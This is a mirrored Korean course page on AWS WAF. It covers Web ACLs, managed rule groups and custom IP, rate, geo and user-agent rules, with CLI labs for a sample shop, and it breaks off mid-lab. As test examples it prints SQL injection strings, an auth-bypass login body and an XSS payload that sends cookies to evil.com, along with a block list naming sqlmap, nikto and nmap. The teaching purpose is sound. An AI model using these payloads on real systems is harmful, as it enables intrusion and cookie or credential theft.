<!DOCTYPE html>
<html lang="ko">

<!-- Mirrored from rapa-aws-security.vercel.app/chapters/08-waf.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 26 Feb 2026 08:26:36 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>AWS WAF - AWS 클라우드 보안</title>
  <link href="../../cdn.jsdelivr.net/gh/orioncactus/pretendard/dist/web/static/pretendard.css" rel="stylesheet">
  <link rel="stylesheet" href="../assets/css/style.css">
</head>
<body>

<header class="site-header">
  <div class="header-inner">
    <a href="../index.html" class="header-logo">
      <span class="aws-icon">&#x1F6E1; AWS Security</span>
      <span>클라우드 보안 강의</span>
    </a>
  </div>
</header>

<div class="page-layout">
  <nav class="sidebar">
    <ul class="sidebar-nav">
      <li><a href="#waf-concept">WAF 개념 & Web ACL</a></li>
      <li><a href="#managed-rules">관리형 규칙 그룹</a></li>
      <li><a href="#custom-rules">커스텀 규칙 작성</a></li>
      <li><a href="#waf-lab">WAF 연동 실습</a></li>
    </ul>
  </nav>

  <main class="main-content">
    <div class="chapter-header">
      <span class="chapter-num">Chapter 08</span>
      <h1>AWS WAF</h1>
      <div class="objectives">
        <h3>학습 목표</h3>
        <ul>
          <li>WAF의 개념과 Web ACL 구조를 이해한다</li>
          <li>AWS Managed Rules의 종류와 용도를 설명할 수 있다</li>
          <li>커스텀 규칙(IP 차단, Rate-based, Geo-match)을 작성할 수 있다</li>
          <li>ALB/CloudFront에 WAF를 연동하고 공격을 테스트할 수 있다</li>
        </ul>
      </div>
    </div>

    <!-- ==================== Section 1: WAF Concept ==================== -->
    <section class="content-section" id="waf-concept">
      <h2>WAF 개념 & Web ACL</h2>

      <h3>WAF란 무엇인가 (웹 애플리케이션 방화벽)</h3>
      <p>
        AWS WAF(Web Application Firewall)는 웹 애플리케이션으로 들어오는 HTTP/HTTPS 요청을 검사하여
        <strong>악성 트래픽을 차단</strong>하는 서비스입니다. SQL Injection, Cross-Site Scripting(XSS),
        봇 트래픽, DDoS 등 다양한 웹 공격으로부터 애플리케이션을 보호합니다.
      </p>

      <p>
        네트워크 방화벽(보안그룹, NACL)이 IP/포트 수준에서 트래픽을 제어한다면,
        WAF는 <strong>애플리케이션 레벨(Layer 7)</strong>에서 HTTP 요청의 내용을 분석합니다.
        요청 본문, 헤더, URI, 쿼리 문자열 등을 검사할 수 있습니다.
      </p>

      <div class="info-box analogy">
        <div class="info-box-title">비유: "공항 보안 검색대"</div>
        <p>
          공항에 비유하면, 보안그룹과 NACL은 <strong>여권 검사</strong>입니다.
          여권(IP 주소)과 비자(포트)를 확인하여 입국 허가 여부를 결정합니다.
          반면 WAF는 <strong>수하물 보안 검색대</strong>입니다.
          여권이 유효하더라도 가방 속(HTTP 요청 본문)에 위험한 물건(SQL Injection 코드)이 있으면 차단합니다.
          두 단계의 검사가 모두 통과해야 안전하게 입장할 수 있습니다.
        </p>
      </div>

      <h3>Web ACL 구조</h3>
      <p>
        WAF의 핵심 구성 요소는 <strong>Web ACL(Web Access Control List)</strong>입니다.
        Web ACL은 규칙(Rule)의 집합이며, 각 규칙은 요청을 검사하고 허용/차단/카운트 액션을 수행합니다.
      </p>

      <div class="diagram">
        <div class="diagram-title">Web ACL 구조</div>
        <div class="diagram-row">
          <div class="diagram-box waf">
            <strong>Web ACL</strong><br>
            ShopEasy-Web-ACL<br>
            기본 액션: Allow
          </div>
        </div>
        <div class="diagram-row">
          <div class="diagram-box security">
            <strong>규칙 그룹 1</strong><br>
            AWS Managed Rules<br>
            Core Rule Set (CRS)
          </div>
          <div class="diagram-box security">
            <strong>규칙 그룹 2</strong><br>
            AWS Managed Rules<br>
            SQL Injection
          </div>
          <div class="diagram-box security">
            <strong>규칙 3</strong><br>
            커스텀 규칙<br>
            Rate-based (2000/5min)
          </div>
          <div class="diagram-box security">
            <strong>규칙 4</strong><br>
            커스텀 규칙<br>
            Geo-match (국가 차단)
          </div>
        </div>
        <div class="diagram-row">
          <div class="diagram-box compute">
            <strong>우선순위 평가</strong><br>
            낮은 번호 먼저 평가 → 첫 번째 매칭 규칙의 액션 적용
          </div>
        </div>
      </div>

      <table>
        <thead>
          <tr>
            <th>구성 요소</th>
            <th>설명</th>
            <th>비유</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>Web ACL</strong></td>
            <td>규칙들의 컨테이너. 기본 액션(Allow/Block)을 설정</td>
            <td>보안 검색대 전체</td>
          </tr>
          <tr>
            <td><strong>Rule</strong></td>
            <td>개별 검사 조건과 액션 (Block, Allow, Count)</td>
            <td>개별 검사 항목</td>
          </tr>
          <tr>
            <td><strong>Rule Group</strong></td>
            <td>관련 규칙들의 묶음 (관리형/커스텀)</td>
            <td>검사 카테고리</td>
          </tr>
          <tr>
            <td><strong>Statement</strong></td>
            <td>규칙의 검사 조건 (IP, 문자열, 크기 등)</td>
            <td>검사 기준</td>
          </tr>
          <tr>
            <td><strong>Action</strong></td>
            <td>조건 매칭 시 수행할 동작</td>
            <td>통과/차단/기록</td>
          </tr>
        </tbody>
      </table>

      <h3>WAF 배치 가능 위치</h3>
      <p>AWS WAF는 다음 리소스에 연결하여 사용할 수 있습니다:</p>

      <table>
        <thead>
          <tr>
            <th>리소스</th>
            <th>용도</th>
            <th>ShopEasy 활용</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>Application Load Balancer (ALB)</strong></td>
            <td>리전 레벨에서 웹 트래픽 보호</td>
            <td>ShopEasy API 서버 앞단 보호</td>
          </tr>
          <tr>
            <td><strong>Amazon CloudFront</strong></td>
            <td>글로벌 엣지에서 트래픽 차단 (원본 도달 전)</td>
            <td>정적 콘텐츠 + API의 글로벌 보호</td>
          </tr>
          <tr>
            <td><strong>Amazon API Gateway</strong></td>
            <td>REST API 보호</td>
            <td>ShopEasy REST API 보호</td>
          </tr>
          <tr>
            <td><strong>AWS AppSync</strong></td>
            <td>GraphQL API 보호</td>
            <td>-</td>
          </tr>
          <tr>
            <td><strong>Amazon Cognito User Pool</strong></td>
            <td>인증 엔드포인트 보호</td>
            <td>-</td>
          </tr>
        </tbody>
      </table>

      <div class="diagram">
        <div class="diagram-title">WAF 배치 아키텍처 - ShopEasy</div>
        <div class="diagram-row">
          <div class="diagram-box user">
            <strong>사용자</strong><br>
            HTTP/HTTPS 요청
          </div>
        </div>
        <div class="diagram-row">
          <div class="diagram-box cdn">
            <strong>CloudFront</strong><br>
            + WAF (글로벌 보호)
          </div>
        </div>
        <div class="diagram-row">
          <div class="diagram-box network">
            <strong>ALB</strong><br>
            + WAF (리전 보호)
          </div>
        </div>
        <div class="diagram-row">
          <div class="diagram-box compute">
            <strong>EC2 (API Server)</strong><br>
            ShopEasy 애플리케이션
          </div>
        </div>
      </div>

      <div class="info-box tip">
        <div class="info-box-title">CloudFront + ALB 이중 WAF 전략</div>
        <p>
          CloudFront와 ALB 모두에 WAF를 적용할 수 있습니다.
          <strong>CloudFront WAF</strong>에서는 글로벌 봇 차단, 국가별 차단 등 대략적인 필터링을 하고,
          <strong>ALB WAF</strong>에서는 SQL Injection, XSS 등 정밀한 검사를 수행합니다.
          이렇게 하면 악성 트래픽이 원본 서버에 도달하기 전에 두 번 걸러집니다.
        </p>
      </div>

      <div class="info-box warning">
        <div class="info-box-title">WAF 용량 단위 (WCU)</div>
        <p>
          각 Web ACL에는 <strong>WCU(Web ACL Capacity Unit)</strong> 한도가 있습니다 (기본 1,500 WCU).
          각 규칙은 WCU를 소비하며, 복잡한 규칙일수록 더 많은 WCU가 필요합니다.
          AWS Managed Rule Group은 각각 정해진 WCU를 가지고 있으므로,
          어떤 규칙 그룹을 얼마나 사용할지 계획해야 합니다.
        </p>
      </div>
    </section>

    <!-- ==================== Section 2: Managed Rules ==================== -->
    <section class="content-section" id="managed-rules">
      <h2>관리형 규칙 그룹 (AWS Managed Rules)</h2>

      <p>
        AWS Managed Rules는 AWS가 제공하고 관리하는 <strong>사전 구성된 규칙 세트</strong>입니다.
        보안 전문가가 아니더라도 이 규칙 그룹을 Web ACL에 추가하는 것만으로
        일반적인 웹 공격으로부터 보호할 수 있습니다. 규칙은 AWS가 자동으로 업데이트합니다.
      </p>

      <h3>AWS Managed Rules 목록</h3>
      <table>
        <thead>
          <tr>
            <th>규칙 그룹</th>
            <th>WCU</th>
            <th>설명</th>
            <th>ShopEasy 적용</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>AWSManagedRulesCommonRuleSet</strong></td>
            <td>700</td>
            <td>OWASP Top 10 대응, 일반적인 웹 공격 차단</td>
            <td>필수 적용</td>
          </tr>
          <tr>
            <td><strong>AWSManagedRulesSQLiRuleSet</strong></td>
            <td>200</td>
            <td>SQL Injection 공격 패턴 탐지</td>
            <td>필수 적용 (DB 보호)</td>
          </tr>
          <tr>
            <td><strong>AWSManagedRulesKnownBadInputsRuleSet</strong></td>
            <td>200</td>
            <td>알려진 악성 입력 패턴 차단</td>
            <td>권장</td>
          </tr>
          <tr>
            <td><strong>AWSManagedRulesLinuxRuleSet</strong></td>
            <td>200</td>
            <td>Linux 관련 LFI(Local File Inclusion) 공격 차단</td>
            <td>권장 (Linux EC2 사용)</td>
          </tr>
          <tr>
            <td><strong>AWSManagedRulesAmazonIpReputationList</strong></td>
            <td>25</td>
            <td>AWS 위협 인텔리전스 기반 악성 IP 차단</td>
            <td>필수 적용</td>
          </tr>
          <tr>
            <td><strong>AWSManagedRulesAnonymousIpList</strong></td>
            <td>50</td>
            <td>VPN, 프록시, Tor 등 익명 IP 차단</td>
            <td>선택적 (정상 VPN 사용자 차단 주의)</td>
          </tr>
          <tr>
            <td><strong>AWSManagedRulesBotControlRuleSet</strong></td>
            <td>50</td>
            <td>봇 트래픽 탐지 및 관리</td>
            <td>권장 (스크래핑, 스팸 방지)</td>
          </tr>
          <tr>
            <td><strong>AWSManagedRulesATPRuleSet</strong></td>
            <td>50</td>
            <td>계정 탈취 방지 (로그인 보호)</td>
            <td>권장 (로그인 기능 보호)</td>
          </tr>
        </tbody>
      </table>

      <h3>Core Rule Set (CRS) - 일반 위협</h3>
      <p>
        CRS(Core Rule Set)는 가장 기본적이면서 중요한 관리형 규칙 그룹입니다.
        OWASP Top 10 웹 애플리케이션 보안 위험에 대응하며, 다음과 같은 공격을 차단합니다:
      </p>

      <div class="info-box concept">
        <div class="info-box-title">Core Rule Set이 방어하는 공격 유형</div>
        <p>
          <strong>크기 제한:</strong> 비정상적으로 큰 요청 본문/헤더/쿠키 차단<br>
          <strong>크로스 사이트 스크립팅 (XSS):</strong> 악성 JavaScript 삽입 시도 차단<br>
          <strong>로컬 파일 포함 (LFI):</strong> 서버의 로컬 파일 읽기 시도 차단<br>
          <strong>원격 파일 포함 (RFI):</strong> 외부 악성 스크립트 실행 시도 차단<br>
          <strong>SSRF:</strong> 서버측 요청 위조 차단<br>
          <strong>User-Agent 검사:</strong> 악성 봇/크롤러의 비정상 User-Agent 차단
        </p>
      </div>

      <h3>SQL Injection 규칙</h3>
      <p>
        <code>AWSManagedRulesSQLiRuleSet</code>은 SQL Injection 공격을 전문적으로 탐지합니다.
        쿼리 문자열, 요청 본문, 쿠키, 헤더에서 SQL Injection 패턴을 검사합니다.
      </p>

      <div class="info-box danger">
        <div class="info-box-title">SQL Injection이 ShopEasy에 미치는 위험</div>
        <p>
          ShopEasy API 서버는 사용자 입력을 받아 MySQL 쿼리를 실행합니다.
          SQL Injection 공격이 성공하면:<br>
          <strong>1.</strong> 고객 개인정보(이름, 주소, 결제 정보) 유출<br>
          <strong>2.</strong> 주문 데이터 변조 또는 삭제<br>
          <strong>3.</strong> 관리자 계정 탈취<br>
          <strong>4.</strong> 전체 데이터베이스 덤프 (전체 데이터 유출)<br>
          WAF의 SQL Injection 규칙은 이러한 공격을 애플리케이션에 도달하기 전에 차단합니다.
        </p>
      </div>

      <h3>XSS 규칙</h3>
      <p>
        Cross-Site Scripting(XSS) 공격은 악성 JavaScript 코드를 웹 페이지에 삽입하여
        다른 사용자의 브라우저에서 실행시키는 공격입니다.
        CRS의 XSS 관련 규칙이 이를 탐지합니다.
      </p>

      <div class="code-block">
        <div class="code-header">
          <span class="lang">text</span>
          <button class="copy-btn">복사</button>
        </div>
        <pre><code># SQL Injection 공격 예시 (WAF가 차단)
GET /api/products?category=electronics' OR 1=1--
GET /api/products?id=1 UNION SELECT username, password FROM users--
POST /api/login
Body: {"email": "admin@shop.com' OR '1'='1", "password": "anything"}

# XSS 공격 예시 (WAF가 차단)
GET /api/search?q=&lt;script&gt;document.location='http://evil.com/steal?c='+document.cookie&lt;/script&gt;
POST /api/reviews
Body: {"comment": "&lt;img src=x onerror=alert('XSS')&gt;"}</code></pre>
      </div>

      <h3>Bot Control</h3>
      <p>
        Bot Control 규칙 그룹은 자동화된 봇 트래픽을 식별하고 관리합니다.
        검색 엔진 크롤러 같은 정상 봇은 허용하면서, 악성 봇은 차단합니다.
      </p>

      <table>
        <thead>
          <tr>
            <th>봇 카테고리</th>
            <th>예시</th>
            <th>기본 액션</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>검증된 봇 (Verified)</strong></td>
            <td>Googlebot, Bingbot</td>
            <td>Allow (허용)</td>
          </tr>
          <tr>
            <td><strong>일반 봇</strong></td>
            <td>SEO 크롤러, 모니터링 봇</td>
            <td>Count (카운트)</td>
          </tr>
          <tr>
            <td><strong>스크래퍼</strong></td>
            <td>가격 비교 봇, 콘텐츠 스크래퍼</td>
            <td>Block (차단)</td>
          </tr>
          <tr>
            <td><strong>HTTP 라이브러리</strong></td>
            <td>curl, wget, python-requests</td>
            <td>Count/Block</td>
          </tr>
          <tr>
            <td><strong>악성 봇</strong></td>
            <td>취약점 스캐너, 무차별 대입 봇</td>
            <td>Block (차단)</td>
          </tr>
        </tbody>
      </table>

      <h3>IP Reputation List</h3>
      <div class="info-box tip">
        <div class="info-box-title">IP Reputation List 활용</div>
        <p>
          <code>AWSManagedRulesAmazonIpReputationList</code>는 AWS의 위협 인텔리전스를 기반으로
          악성 활동에 사용되는 것으로 알려진 IP 주소를 자동으로 차단합니다.
          이 목록은 AWS에서 지속적으로 업데이트하므로 별도의 관리 없이 최신 위협 대응이 가능합니다.
          WCU도 25로 매우 적어 부담 없이 추가할 수 있습니다.
          <strong>모든 Web ACL에 기본으로 추가하는 것을 권장합니다.</strong>
        </p>
      </div>
    </section>

    <!-- ==================== Section 3: Custom Rules ==================== -->
    <section class="content-section" id="custom-rules">
      <h2>커스텀 규칙 작성</h2>

      <p>
        AWS Managed Rules만으로 충분하지 않은 경우, 비즈니스 요구사항에 맞는 커스텀 규칙을 작성할 수 있습니다.
        IP 차단, 요청 속도 제한, 국가별 차단, 문자열 매칭 등 다양한 조건을 조합할 수 있습니다.
      </p>

      <h3>IP 차단 규칙 (IP Set)</h3>
      <p>
        IP Set을 생성하여 특정 IP 주소나 CIDR 블록을 차단합니다.
        보안 사고 발생 시 공격 IP를 즉시 차단하는 데 유용합니다.
      </p>

      <div class="code-block">
        <div class="code-header">
          <span class="lang">bash</span>
          <button class="copy-btn">복사</button>
        </div>
        <pre><code># IP Set 생성 (차단할 IP 목록)
aws wafv2 create-ip-set \
  --name "ShopEasy-BlockedIPs" \
  --scope REGIONAL \
  --ip-address-version IPV4 \
  --addresses "203.0.113.0/24" "198.51.100.50/32" "192.0.2.0/24" \
  --description "ShopEasy 차단 IP 목록"

# IP Set에 IP 추가
aws wafv2 update-ip-set \
  --name "ShopEasy-BlockedIPs" \
  --scope REGIONAL \
  --id "ip-set-id" \
  --lock-token "lock-token" \
  --addresses "203.0.113.0/24" "198.51.100.50/32" "192.0.2.0/24" "172.16.0.0/12"</code></pre>
      </div>

      <div class="code-block">
        <div class="code-header">
          <span class="lang">json</span>
          <button class="copy-btn">복사</button>
        </div>
        <pre><code>{
  "Name": "BlockBadIPs",
  "Priority": 0,
  "Statement": {
    "IPSetReferenceStatement": {
      "ARN": "arn:aws:wafv2:ap-northeast-2:123456789012:regional/ipset/ShopEasy-BlockedIPs/abcd1234"
    }
  },
  "Action": {
    "Block": {}
  },
  "VisibilityConfig": {
    "SampledRequestsEnabled": true,
    "CloudWatchMetricsEnabled": true,
    "MetricName": "BlockBadIPs"
  }
}</code></pre>
      </div>

      <h3>Rate-based 규칙 (DDoS 완화)</h3>
      <p>
        Rate-based 규칙은 동일 IP에서 특정 기간(5분) 내에 과도한 요청이 발생하면 자동으로 차단합니다.
        DDoS 공격, 무차별 대입 공격(brute force), 크롤링 봇을 효과적으로 완화합니다.
      </p>

      <div class="code-block">
        <div class="code-header">
          <span class="lang">json</span>
          <button class="copy-btn">복사</button>
        </div>
        <pre><code>{
  "Name": "RateLimitPerIP",
  "Priority": 1,
  "Statement": {
    "RateBasedStatement": {
      "Limit": 2000,
      "AggregateKeyType": "IP"
    }
  },
  "Action": {
    "Block": {}
  },
  "VisibilityConfig": {
    "SampledRequestsEnabled": true,
    "CloudWatchMetricsEnabled": true,
    "MetricName": "RateLimitPerIP"
  }
}</code></pre>
      </div>

      <div class="info-box concept">
        <div class="info-box-title">Rate-based 규칙의 동작 원리</div>
        <p>
          Rate-based 규칙은 <strong>슬라이딩 윈도우 5분</strong> 기간 동안 동일 IP의 요청 수를 카운트합니다.
          설정한 임계값(예: 2,000)을 초과하면 해당 IP를 자동으로 차단하고,
          요청 속도가 임계값 아래로 떨어지면 자동으로 차단을 해제합니다.<br><br>
          <strong>ShopEasy 권장 임계값:</strong><br>
          - 일반 페이지: 2,000 요청/5분<br>
          - 로그인 API: 100 요청/5분 (Scope-down statement 활용)<br>
          - 검색 API: 500 요청/5분
        </p>
      </div>

      <div class="code-block">
        <div class="code-header">
          <span class="lang">json</span>
          <button class="copy-btn">복사</button>
        </div>
        <pre><code>{
  "Name": "LoginRateLimit",
  "Priority": 2,
  "Statement": {
    "RateBasedStatement": {
      "Limit": 100,
      "AggregateKeyType": "IP",
      "ScopeDownStatement": {
        "ByteMatchStatement": {
          "SearchString": "/api/auth/login",
          "FieldToMatch": {
            "UriPath": {}
          },
          "TextTransformations": [
            {
              "Priority": 0,
              "Type": "LOWERCASE"
            }
          ],
          "PositionalConstraint": "STARTS_WITH"
        }
      }
    }
  },
  "Action": {
    "Block": {
      "CustomResponse": {
        "ResponseCode": 429,
        "CustomResponseBodyKey": "TooManyRequests"
      }
    }
  },
  "VisibilityConfig": {
    "SampledRequestsEnabled": true,
    "CloudWatchMetricsEnabled": true,
    "MetricName": "LoginRateLimit"
  }
}</code></pre>
      </div>

      <h3>Geo-match 규칙 (국가별 차단)</h3>
      <p>
        Geo-match 규칙은 요청의 출발 국가를 기반으로 트래픽을 제어합니다.
        ShopEasy가 한국에서만 서비스한다면, 특정 국가의 트래픽을 차단하거나,
        한국만 허용하는 화이트리스트 방식을 적용할 수 있습니다.
      </p>

      <div class="code-block">
        <div class="code-header">
          <span class="lang">json</span>
          <button class="copy-btn">복사</button>
        </div>
        <pre><code>{
  "Name": "GeoBlockHighRiskCountries",
  "Priority": 3,
  "Statement": {
    "GeoMatchStatement": {
      "CountryCodes": ["RU", "CN", "KP", "IR"]
    }
  },
  "Action": {
    "Block": {
      "CustomResponse": {
        "ResponseCode": 403,
        "ResponseHeaders": [
          {
            "Name": "x-blocked-reason",
            "Value": "geo-restriction"
          }
        ]
      }
    }
  },
  "VisibilityConfig": {
    "SampledRequestsEnabled": true,
    "CloudWatchMetricsEnabled": true,
    "MetricName": "GeoBlock"
  }
}</code></pre>
      </div>

      <div class="info-box warning">
        <div class="info-box-title">Geo-match 주의사항</div>
        <p>
          <strong>1. VPN 우회:</strong> 공격자는 VPN을 사용하여 다른 국가의 IP로 접속할 수 있습니다.
          Geo-match만으로는 완벽한 차단이 불가능합니다.<br>
          <strong>2. 정상 사용자 차단:</strong> 해외 여행 중인 한국 고객이 차단될 수 있습니다.<br>
          <strong>3. Count 모드 먼저:</strong> 처음에는 Block 대신 Count로 설정하여 영향 범위를 확인한 후 Block으로 전환하세요.
        </p>
      </div>

      <h3>문자열 매칭 규칙</h3>
      <p>
        HTTP 요청의 특정 부분에서 문자열 패턴을 검사하는 규칙입니다.
        특정 User-Agent, 요청 경로, 쿼리 파라미터 등을 검사할 수 있습니다.
      </p>

      <div class="code-block">
        <div class="code-header">
          <span class="lang">json</span>
          <button class="copy-btn">복사</button>
        </div>
        <pre><code>{
  "Name": "BlockMaliciousUserAgents",
  "Priority": 4,
  "Statement": {
    "OrStatement": {
      "Statements": [
        {
          "ByteMatchStatement": {
            "SearchString": "sqlmap",
            "FieldToMatch": {
              "SingleHeader": {
                "Name": "user-agent"
              }
            },
            "TextTransformations": [
              { "Priority": 0, "Type": "LOWERCASE" }
            ],
            "PositionalConstraint": "CONTAINS"
          }
        },
        {
          "ByteMatchStatement": {
            "SearchString": "nikto",
            "FieldToMatch": {
              "SingleHeader": {
                "Name": "user-agent"
              }
            },
            "TextTransformations": [
              { "Priority": 0, "Type": "LOWERCASE" }
            ],
            "PositionalConstraint": "CONTAINS"
          }
        },
        {
          "ByteMatchStatement": {
            "SearchString": "nmap",
            "FieldToMatch": {
              "SingleHeader": {
                "Name": "user-agent"
              }
            },
            "TextTransformations": [
              { "Priority": 0, "Type": "LOWERCASE" }
            ],
            "PositionalConstraint": "CONTAINS"
          }
        }
      ]
    }
  },
  "Action": {
    "Block": {}
  },
  "VisibilityConfig": {
    "SampledRequestsEnabled": true,
    "CloudWatchMetricsEnabled": true,
    "MetricName": "BlockMaliciousUserAgents"
  }
}</code></pre>
      </div>

      <div class="info-box tip">
        <div class="info-box-title">커스텀 규칙 작성 팁</div>
        <p>
          <strong>1. Count 모드부터 시작:</strong> 새 규칙은 먼저 Count(카운트) 액션으로 배포하여 오탐(false positive)을 확인합니다.<br>
          <strong>2. TextTransformation 활용:</strong> LOWERCASE, URL_DECODE, HTML_ENTITY_DECODE 등 변환을 적용하여 우회를 방지합니다.<br>
          <strong>3. 라벨링:</strong> 규칙에 라벨을 추가하여 이후 규칙에서 참조할 수 있습니다.<br>
          <strong>4. 커스텀 응답:</strong> Block 시 적절한 HTTP 상태 코드와 메시지를 반환합니다.
        </p>
      </div>
    </section>

    <!-- ==================== Section 4: WAF Lab ==================== -->
    <section class="content-section" id="waf-lab">
      <h2>ALB/CloudFront에 WAF 연동 실습</h2>

      <!-- Lab: Web ACL 생성 -->
      <div class="lab-section">
        <h3 class="lab-title">Lab 1: Web ACL 생성</h3>
        <div class="steps">
          <div class="step">
            <div class="step-title">Step 1: Web ACL 생성 (AWS CLI)</div>
            <p>ShopEasy용 Web ACL을 생성합니다. 기본 액션은 Allow로 설정하여, 규칙에 매칭되지 않는 요청은 허용합니다.</p>
            <div class="code-block">
              <div class="code-header">
                <span class="lang">bash</span>
                <button class="copy-btn">복사</button>
              </div>
              <pre><code># Web ACL JSON 파일 생성
cat &gt; shopeasy-web-acl.json &lt;&lt; 'JSONEOF'
{
  "Name": "ShopEasy-WebACL",
  "Scope": "REGIONAL",
  "DefaultAction": {
    "Allow": {}
  },
  "Description": "ShopEasy 이커머스 웹 애플리케이션 보호",
  "Rules": [],
  "VisibilityConfig": {
    "SampledRequestsEnabled": true,
    "CloudWatchMetricsEnabled": true,
    "MetricName": "ShopEasyWebACL"
  },
  "Tags": [
    {
      "Key": "Project",
      "Value": "ShopEasy"
    },
    {
      "Key": "Environment",
      "Value": "Production"
    }
  ]
}
JSONEOF

# Web ACL 생성
aws wafv2 create-web-acl \
  --name ShopEasy-WebACL \
  --scope REGIONAL \
  --default-action Allow={} \
  --visibility-config SampledRequestsEnabled=true,CloudWatchMetricsEnabled=true,MetricName=ShopEasyWebACL \
  --description "ShopEasy 이커머스 웹 애플리케이션 보호" \
  --region ap-northeast-2</code></pre>
            </div>
          </div>
        </div>
      </div>

      <!-- Lab: 관리형 규칙 추가 -->
      <div class="lab-section">
        <h3 class="lab-title">Lab 2: 관리형 규칙 추가</h3>
        <div class="steps">
          <div class="step">
            <div class="step-title">Step 1: Web ACL에 관리형 규칙 그룹 추가</div>
            <p>IP Reputation, Core Rule Set, SQL Injection 규칙 그룹을 추가합니다.</p>
            <div class="code-block">
              <div class="code-header">
                <span class="lang">bash</span>
                <button class="copy-btn">복사</button>
              </div>
              <pre><code># Web ACL 업데이트 (규칙 추가)
aws wafv2 update-web-acl \
  --name ShopEasy-WebACL \
  --scope REGIONAL \
  --id "web-acl-id" \
  --lock-token "lock-token" \
  --default-action Allow={} \
  --visibility-config SampledRequestsEnabled=true,CloudWatchMetricsEnabled=true,MetricName=ShopEasyWebACL \
  --rules '[
    {
      "Name": "AWS-AmazonIpReputationList",
      "Priority": 0,
      "Statement": {
        "ManagedRuleGroupStatement": {
          "VendorName": "AWS",
          "Name": "AWSManagedRulesAmazonIpReputationList"
        }
      },
      "OverrideAction": { "None": {} },
      "VisibilityConfig": {
        "SampledRequestsEnabled": true,
        "CloudWatchMetricsEnabled": true,
        "MetricName": "AWSIpReputation"
      }
    },
    {
      "Name": "AWS-CommonRuleSet",
      "Priority": 1,
      "Statement": {
        "ManagedRuleGroupStatement": {
          "VendorName": "AWS",
          "Name": "AWSManagedRulesCommonRuleSet"
        }
      },
      "OverrideAction": { "None": {} },
      "VisibilityConfig": {
        "SampledRequestsEnabled": true,
        "CloudWatchMetricsEnabled": true,
        "MetricName": "AWSCommonRules"
      }
    },
    {
      "Name": "AWS-SQLInjection",
      "Priority": 2,
      "Statement": {
        "ManagedRuleGroupStatement": {
          "VendorName": "AWS",
          "Name": "AWSManagedRulesSQLiRuleSet"
        }
      },
      "OverrideAction": { "None": {} },
      "VisibilityConfig": {
        "SampledRequestsEnabled": true,
        "CloudWatchMetricsEnabled": true,
        "MetricName": "AWSSQLInjection"
      }
    },
    {
      "Name": "RateLimit",
      "Priority": 3,
      "Statement": {
        "RateBasedStatement": {
          "Limit": 2000,
          "AggregateKeyType": "IP"
        }
      },
      "Action": { "Block": {} },
      "VisibilityConfig": {
        "SampledRequestsEnabled": true,
        "CloudWatchMetricsEnabled": true,
        "MetricName": "RateLimit"
      }
    }
  ]'</code></pre>
            </div>
          </div>

          <div class="step">
            <div class="step-title">Step 2: 규칙 우선순위 확인</div>
            <p>규칙이 올바른 우선순위로 추가되었는지 확인합니다.</p>
            <div class="code-block">
              <div class="code-header">
                <span class="lang">bash</span>
                <button class="copy-btn">복사</button>
              </div>
              <pre><code># Web ACL 상세 정보 확인
aws wafv2 get-web-acl \
  --name ShopEasy-WebACL \
  --scope REGIONAL \
  --id "web-acl-id" \
  --query 'WebACL.Rules[].{Name:Name,Priority:Priority}' \
  --output table</code></pre>
            </div>
          </div>
        </div>
      </div>

      <!-- Lab: ALB에 WAF 연동 -->
      <div class="lab-section">
        <h3 class="lab-title">Lab 3: ALB에 WAF 연동</h3>
        <div class="steps">
          <div class="step">
            <div class="step-title">Step 1: ALB에 Web ACL 연결</div>
            <p>ShopEasy의 ALB에 생성한 Web ACL을 연결합니다.</p>
            <div class="code-block">
              <div class="code-header">
                <span class="lang">bash</span>
                <button class="copy-btn">복사</button>
              </div>
              <pre><code># ALB ARN 확인
ALB_ARN=$(aws elbv2 describe-load-balancers \
  --names shopeasy-alb \
  --query 'LoadBalancers[0].LoadBalancerArn' --output text)

# Web ACL ARN 확인
WEBACL_ARN=$(aws wafv2 list-web-acls \
  --scope REGIONAL \
  --query "WebACLs[?Name=='ShopEasy-WebACL'].ARN" --output text)

# ALB에 Web ACL 연결
aws wafv2 associate-web-acl \
  --web-acl-arn $WEBACL_ARN \
  --resource-arn $ALB_ARN

# 연결 확인
aws wafv2 get-web-acl-for-resource \
  --resource-arn $ALB_ARN \
  --query 'WebACL.Name' --output text</code></pre>
            </div>
          </div>

          <div class="step">
            <div class="step-title">Step 2: 연결 상태 검증</div>
            <p>WAF가 ALB에 올바르게 연결되었는지 확인합니다.</p>
            <div class="code-block">
              <div class="code-header">
                <span class="lang">bash</span>
                <button class="copy-btn">복사</button>
              </div>
              <pre><code># Web ACL에 연결된 리소스 확인
aws wafv2 list-resources-for-web-acl \
  --web-acl-arn $WEBACL_ARN \
  --resource-type APPLICATION_LOAD_BALANCER

# 정상 요청 테스트
curl -v https://shop.example.com/api/products
# 예상: 200 OK

# 간단한 SQL Injection 테스트
curl -v "https://shop.example.com/api/products?id=1' OR 1=1--"
# 예상: 403 Forbidden</code></pre>
            </div>
          </div>
        </div>
      </div>

      <!-- Lab: SQL Injection 테스트 -->
      <div class="lab-section">
        <h3 class="lab-title">Lab 4: SQL Injection 테스트</h3>
        <div class="steps">
          <div class="step">
            <div class="step-title">Step 1: 다양한 SQL Injection 공격 시도</div>
            <p>WAF가 다양한 SQL Injection 패턴을 차단하는지 테스트합니다.</p>
            <div class="code-block">
              <div class="code-header">
                <span class="lang">bash</span>
                <button class="copy-btn">복사</button>
              </div>
              <pre><code># 테스트 1: 기본 SQL Injection (쿼리 파라미터)
curl -w "\nHTTP Code: %{http_code}\n" \
  "https://shop.example.com/api/products?category=electronics' OR 1=1--"
# 예상: 403 Forbidden

# 테스트 2: UNION 기반 SQL Injection
curl -w "\nHTTP Code: %{http_code}\n" \
  "https://shop.example.com/api/products?id=1 UNION SELECT username,password FROM users--"
# 예상: 403 Forbidden

# 테스트 3: POST 요청의 SQL Injection (요청 본문)
curl -X POST -w "\nHTTP Code: %{http_code}\n" \
  -H "Content-Type: application/json" \
  -d '{"email": "admin@shop.com'\'' OR '\''1'\''='\''1", "password": "test"}' \
  "https://shop.example.com/api/auth/login"
# 예상: 403 Forbidden

# 테스트 4: 정상 요청 (차단되지 않아야 함)
